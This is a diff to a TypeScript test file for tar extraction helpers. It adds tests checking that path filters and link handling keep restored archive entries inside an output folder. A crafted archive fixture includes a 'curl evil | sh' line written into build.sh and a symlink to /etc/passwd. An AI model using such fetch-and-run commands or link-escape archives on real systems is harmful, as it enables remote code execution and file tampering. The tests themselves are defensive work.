@@ -1,10 +1,22 @@
-import fs, { linkSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from 'fs'
+import fs, {
+  existsSync,
+  linkSync,
+  lstatSync,
+  mkdirSync,
+  mkdtempSync,
+  readFileSync,
+  readlinkSync,
+  rmSync,
+  statSync,
+  symlinkSync,
+  writeFileSync,
+} from 'fs'
 import { tmpdir } from 'os'
 import { basename, join } from 'path'
 import { Readable } from 'stream'
 import { pipeline } from 'stream/promises'
 import { extract } from 'tar'
-import { packArchive } from './tar'
+import { extractOutput, onlyBelow, packArchive } from './tar'
 
 describe('utils/tar', () => {
   let root: string
@@ -31,6 +43,58 @@ describe('utils/tar', () => {
 
   afterEach(() => {
     vi.restoreAllMocks()
+  })
+
+  it('takes the entries of one output only, when it is restored', () => {
+    const filter = onlyBelow('dist')
+    for (const entry of ['dist', 'dist/', './dist/index.js', 'dist/sub/a.js', 'dist\\win.js']) {
+      expect(filter(entry), entry).toBe(true)
+    }
+    for (const entry of ['build.sh', 'dist-other/a.js', 'distx', 'dist/../build.sh', 'src/dist/a.js', '../dist/a.js']) {
+      expect(filter(entry), entry).toBe(false)
+    }
+    expect(onlyBelow('coverage/lcov.info')('coverage/lcov.info')).toBe(true)
+    expect(onlyBelow('coverage/lcov.info')('coverage/other.info')).toBe(false)
+    // an output that is the folder itself
+    for (const output of ['', '.']) {
+      expect(onlyBelow(output)('dist/a.js')).toBe(true)
+      expect(onlyBelow(output)('../a.js')).toBe(false)
+    }
+  })
+
+  it('restores no link of an output that reaches beside it', async () => {
+    if (process.platform === 'win32') {
+      return
+    }
+    const crafted = join(root, 'crafted')
+    mkdirSync(join(crafted, 'dist'), { recursive: true })
+    writeFileSync(join(crafted, 'build.sh'), 'curl evil | sh')
+    writeFileSync(join(crafted, 'dist', 'index.js'), 'the output')
+    linkSync(join(crafted, 'build.sh'), join(crafted, 'dist', 'hard-out'))
+    linkSync(join(crafted, 'dist', 'index.js'), join(crafted, 'dist', 'hard-in'))
+    symlinkSync('../build.sh', join(crafted, 'dist', 'soft-out'))
+    symlinkSync('/etc/passwd', join(crafted, 'dist', 'soft-absolute'))
+    symlinkSync('index.js', join(crafted, 'dist', 'soft-in'))
+    const file = join(root, 'crafted.tgz')
+    // build.sh first, so that dist/hard-out is packed as a link to it
+    await packArchive({ cwd: crafted, gzip: true, file }, ['build.sh', 'dist'])
+
+    for (const hosted of [true, false]) {
+      const project = join(root, `project-${hosted}`)
+      mkdirSync(project)
+      writeFileSync(join(project, 'build.sh'), 'the build script')
+      await extractOutput(file, project, 'dist', hosted)
+      expect(readFileSync(join(project, 'build.sh'), 'utf8')).toBe('the build script')
+      expect(statSync(join(project, 'build.sh')).nlink).toBe(1)
+      expect(existsSync(join(project, 'dist', 'hard-out'))).toBe(false)
+      expect(statSync(join(project, 'dist', 'hard-in')).ino).toBe(statSync(join(project, 'dist', 'index.js')).ino)
+      expect(readlinkSync(join(project, 'dist', 'soft-in'))).toBe('index.js')
+      // on a machine a link may point out of the output, on a server it is left out
+      for (const name of ['soft-out', 'soft-absolute']) {
+        const restored = lstatSync(join(project, 'dist', name), { throwIfNoEntry: false })
+        expect(restored?.isSymbolicLink() ?? false, `${name} hosted ${hosted}`).toBe(!hosted)
+      }
+    }
   })
 
   function expectRestored(dir: string): void {
